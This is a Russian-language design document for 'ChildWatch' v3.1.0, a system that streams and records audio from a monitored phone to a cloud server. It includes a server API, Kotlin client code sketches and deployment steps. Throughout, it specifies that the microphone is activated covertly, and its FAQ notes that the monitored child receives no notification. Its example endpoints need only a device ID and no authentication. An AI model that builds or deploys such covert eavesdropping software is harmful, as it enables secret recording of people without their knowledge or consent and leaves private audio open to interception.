# 🎙️ Система Аудио-Стриминга ChildWatch v3.1.0

## 📋 Обзор

Система аудио-мониторинга работает в **двух режимах**:

### А) 🎧 Прослушка в реальном времени (БЕЗ записи)
- **Скрытная автоматическая активация** на телефоне ребенка
- Родитель слушает аудио в реальном времени
- Аудио НЕ сохраняется на сервере
- Буфер хранит только последние 30 секунд для стабильности

### Б) ⏺️ Прослушка С записью
- Во время прослушки родитель нажимает кнопку "Запись"
- Аудио начинает сохраняться на сервере
- После остановки - файл доступен для скачивания и воспроизведения

---

## 🏗️ Архитектура

```
┌─────────────────────┐         ┌─────────────────────┐         ┌─────────────────────┐
│  РОДИТЕЛЬ           │         │  СЕРВЕР (Cloud)     │         │  РЕБЕНОК            │
│  ChildWatch         │         │  Railway/Render     │         │  ParentWatch        │
└─────────────────────┘         └─────────────────────┘         └─────────────────────┘

1. Нажимает кнопку     ────────► POST /api/streaming/start
   "Начать прослушку"             deviceId: child-3612

                                 Команда сохранена в очереди

                                                                2. Каждые 30 сек проверяет
                                                                   GET /api/streaming/commands

                                                                3. Получает команду START
                                                                   Включает микрофон СКРЫТНО

                                                                4. Записывает аудио чанки
                                                                   по 2 секунды

                                 ◄──────────────────────────── POST /api/streaming/chunk
                                                                   + audio file (WebM)

                                 Буфер: [chunk1, chunk2, ...]
                                 (хранит последние 15 чанков)

5. Запрашивает аудио   ──────► GET /api/streaming/chunks
   каждые 2 секунды              deviceId: child-3612

   ◄────────────────── Отдает последние 5 чанков
                       в формате Base64

6. Воспроизводит
   аудио в реальном
   времени

7. (ОПЦИОНАЛЬНО)       ──────► POST /api/streaming/record/start
   Нажимает "⏺ Запись"

                                 Флаг recording = true
                                 Начинает сохранять чанки
                                 в файл на диске

8. Продолжает слушать  ◄──────► Чанки продолжают стримиться
   + запись идет                + сохраняются в файл

9. Нажимает "⏹ Стоп    ──────► POST /api/streaming/record/stop
   запись"

                                 Финализирует аудио файл
                                 Сохраняет в базу данных

10. Нажимает "Стоп     ──────► POST /api/streaming/stop
    прослушку"

                                 Команда STOP отправлена

                                                                11. Получает команду STOP
                                                                    Выключает микрофон

                                 Очистка буфера
```

---

## 🔧 Технические детали

### Формат аудио:
- **Кодек**: WebM (Opus)
- **Размер чанка**: ~2 секунды (~50-100 KB)
- **Sample rate**: 44100 Hz
- **Bitrate**: 64 kbps (достаточно для голоса)

### Серверные компоненты:

#### 1. **CommandManager** (`managers/CommandManager.js`)
- Управляет очередью команд для устройств
- Хранит активные сессии стриминга
- Буферизирует аудио-чанки
- Автоматически очищает старые сессии

#### 2. **Streaming Routes** (`routes/streaming.js`)

**Эндпоинты:**

##### Для родителя (ChildWatch):
```
POST /api/streaming/start
Body: { deviceId: "child-3612", parentId: "parent-xyz" }
→ Запускает прослушку

POST /api/streaming/stop
Body: { deviceId: "child-3612" }
→ Останавливает прослушку

POST /api/streaming/record/start
Body: { deviceId: "child-3612" }
→ Начинает запись во время прослушки

POST /api/streaming/record/stop
Body: { deviceId: "child-3612" }
→ Останавливает запись

GET /api/streaming/chunks/:deviceId?count=5
→ Получает последние 5 аудио-чанков для воспроизведения

GET /api/streaming/status/:deviceId
→ Статус сессии (streaming, recording, duration)
```

##### Для ребенка (ParentWatch):
```
GET /api/streaming/commands/:deviceId
→ Получает pending команды (start/stop stream/record)

POST /api/streaming/chunk
Multipart: audio file + deviceId + sequence + recording flag
→ Загружает аудио-чанк на сервер
```

---

## 📱 Клиентская часть (TODO - требуется реализация)

### ParentWatch (телефон ребенка) - НУЖНО ДОРАБОТАТЬ:

**Что нужно добавить:**

1. **Фоновый сервис проверки команд**
   ```kotlin
   // В LocationService.kt добавить:
   class LocationService {
       private fun checkStreamingCommands() {
           // Каждые 30 сек проверяем команды
           val response = networkHelper.getStreamingCommands(deviceId)

           for (command in response.commands) {
               when (command.type) {
                   "start_audio_stream" -> startAudioStreaming()
                   "stop_audio_stream" -> stopAudioStreaming()
                   "start_recording" -> isRecording = true
                   "stop_recording" -> isRecording = false
               }
           }
       }
   }
   ```

2. **Аудио-рекордер с чанками**
   ```kotlin
   class AudioStreamRecorder {
       private val mediaRecorder = MediaRecorder()

       fun startStreaming(deviceId: String) {
           // Настройка: WebM, Opus, 64kbps
           mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC)
           mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.WEBM)
           mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.OPUS)

           // Записываем чанки по 2 секунды
           Timer().scheduleAtFixedRate(2000) {
               val chunk = recordChunk()
               uploadChunk(chunk, deviceId, sequence++, isRecording)
           }
       }
   }
   ```

3. **Загрузка чанков**
   ```kotlin
   suspend fun uploadChunk(
       chunk: ByteArray,
       deviceId: String,
       sequence: Int,
       recording: Boolean
   ) {
       val requestBody = chunk.toRequestBody("audio/webm".toMediaType())

       api.uploadAudioChunk(
           deviceId = deviceId,
           sequence = sequence,
           recording = recording.toString(),
           audio = MultipartBody.Part.createFormData("audio", "chunk.webm", requestBody)
       )
   }
   ```

### ChildWatch (телефон родителя) - НУЖНО ДОРАБОТАТЬ:

**Что нужно добавить:**

1. **Кнопки управления в AudioActivity**
   ```xml
   <!-- activity_audio.xml -->
   <Button
       android:id="@+id/startStreamButton"
       android:text="🎧 Начать прослушку" />

   <Button
       android:id="@+id/recordToggleButton"
       android:text="⏺ Начать запись"
       android:enabled="false" />

   <Button
       android:id="@+id/stopStreamButton"
       android:text="⏹ Остановить"
       android:enabled="false" />
   ```

2. **Логика в AudioActivity.kt**
   ```kotlin
   private fun startStreaming() {
       lifecycleScope.launch {
           // Отправляем команду на сервер
           val response = networkClient.startAudioStream(childDeviceId)

           if (response.success) {
               isStreaming = true
               recordToggleButton.isEnabled = true

               // Начинаем получать и воспроизводить чанки
               startPlaybackLoop()
           }
       }
   }

   private fun startPlaybackLoop() {
       playbackJob = lifecycleScope.launch {
           while (isStreaming) {
               val chunks = networkClient.getAudioChunks(childDeviceId, count = 5)

               for (chunk in chunks) {
                   playAudioChunk(chunk.data) // Base64 → ByteArray → AudioTrack
               }

               delay(2000) // Каждые 2 секунды
           }
       }
   }

   private fun toggleRecording() {
       if (!isRecording) {
           networkClient.startRecording(childDeviceId)
           isRecording = true
           recordToggleButton.text = "⏹ Стоп запись"
       } else {
           networkClient.stopRecording(childDeviceId)
           isRecording = false
           recordToggleButton.text = "⏺ Начать запись"
       }
   }
   ```

3. **Воспроизведение аудио**
   ```kotlin
   private fun playAudioChunk(base64Data: String) {
       val audioData = Base64.decode(base64Data, Base64.DEFAULT)

       // Используем AudioTrack для low-latency воспроизведения
       audioTrack.write(audioData, 0, audioData.size)
   }
   ```

---

## ☁️ ОБЛАЧНЫЙ ДЕПЛОЙ

### Вариант 1: Railway.app (РЕКОМЕНДУЕТСЯ)

**Преимущества:**
- ✅ Бесплатный план: 500 часов/месяц
- ✅ Автоматический SSL (HTTPS)
- ✅ Простой деплой из GitHub
- ✅ PostgreSQL бесплатно включен
- ✅ Public URL автоматически

**Шаги деплоя:**

1. **Создайте аккаунт на [Railway.app](https://railway.app)**

2. **Подключите GitHub репозиторий:**
   - New Project → Deploy from GitHub
   - Выберите репозиторий ChildWatch

3. **Настройте переменные окружения:**
   ```
   PORT=3000
   NODE_ENV=production
   DATABASE_URL=(автоматически создается Railway)
   ```

4. **Деплой автоматический!**
   - При каждом push в GitHub → автоматически деплоится
   - Получите URL: `https://childwatch.up.railway.app`

5. **В приложениях укажите новый URL:**
   ```
   ParentWatch: URL сервера = https://childwatch.up.railway.app
   ChildWatch: Настройки → URL сервера = https://childwatch.up.railway.app
   ```

### Вариант 2: Render.com

**Преимущества:**
- ✅ Полностью бесплатный план (с ограничениями)
- ✅ Автоматический SSL
- ✅ PostgreSQL бесплатно

**Недостатки:**
- ⚠️ "Спит" после 15 минут неактивности
- ⚠️ Первый запрос медленный (~30 сек)

**Шаги:**
1. Зарегистрируйтесь на [Render.com](https://render.com)
2. New → Web Service → Connect GitHub
3. Build Command: `npm install`
4. Start Command: `npm start`
5. Plan: Free

### Вариант 3: Fly.io

**Преимущества:**
- ✅ Бесплатный план для маленьких приложений
- ✅ Очень быстрый (edge network)

**Недостатки:**
- ⚠️ Сложнее настроить

---

## 🔐 Безопасность

**ВАЖНО для продакшена:**

1. **Добавьте аутентификацию к streaming endpoints**
2. **Ограничьте частоту запросов (rate limiting уже есть)**
3. **Шифруйте аудио-чанки (SSL уже есть на Railway)**
4. **Логируйте все сессии прослушки**

---

## 📊 Мониторинг

**Railway автоматически предоставляет:**
- Логи сервера (реальное время)
- Метрики CPU/RAM
- Статус деплоя
- Rollback на предыдущие версии

---

## 🚀 Следующие шаги

### Серверная часть: ✅ ГОТОВО
- ✅ CommandManager
- ✅ Streaming routes
- ✅ Буферизация чанков
- ✅ Railway конфигурация

### Клиентская часть: ⚠️ ТРЕБУЕТСЯ ДОРАБОТКА

**ParentWatch (ребенок):**
- [ ] Добавить проверку команд в LocationService
- [ ] Реализовать AudioStreamRecorder
- [ ] Добавить загрузку чанков

**ChildWatch (родитель):**
- [ ] Обновить AudioActivity UI
- [ ] Реализовать NetworkClient методы для streaming
- [ ] Добавить воспроизведение аудио-чанков
- [ ] Реализовать toggle recording

---

## 💡 Рекомендации по реализации

**Приоритет 1: Минимальный MVP**
1. Реализуйте только прослушку БЕЗ записи
2. Тестируйте на локальном сервере
3. Затем деплой на Railway
4. Тестируйте на реальных устройствах

**Приоритет 2: Добавьте запись**
1. Добавьте кнопку записи
2. Реализуйте сохранение чанков
3. Добавьте список записей

**Приоритет 3: Полировка**
1. Улучшите UI
2. Добавьте индикаторы качества связи
3. Оптимизируйте battery usage

---

## 📝 API Примеры

### Запуск прослушки (curl):
```bash
curl -X POST https://childwatch.up.railway.app/api/streaming/start \
  -H "Content-Type: application/json" \
  -d '{"deviceId":"child-3612","parentId":"parent-001"}'
```

### Получение чанков:
```bash
curl https://childwatch.up.railway.app/api/streaming/chunks/child-3612?count=5
```

### Статус сессии:
```bash
curl https://childwatch.up.railway.app/api/streaming/status/child-3612
```

---

## ❓ FAQ

**Q: Будет ли работать от мобильного интернета?**
A: ✅ Да! Как только сервер задеплоен на Railway с публичным URL.

**Q: Сколько трафика потребляет?**
A: ~2-5 MB за минуту прослушки (зависит от битрейта).

**Q: Ребенок увидит что его слушают?**
A: На Android 12+ может появиться значок микрофона в статус-баре, но никаких уведомлений не будет.

**Q: Можно ли слушать несколько детей одновременно?**
A: ✅ Да, система поддерживает параллельные сессии.

---

**Статус:** Серверная часть готова к деплою. Клиентские приложения требуют доработки.
**Версия:** 3.1.0
**Дата:** 2025-10-05
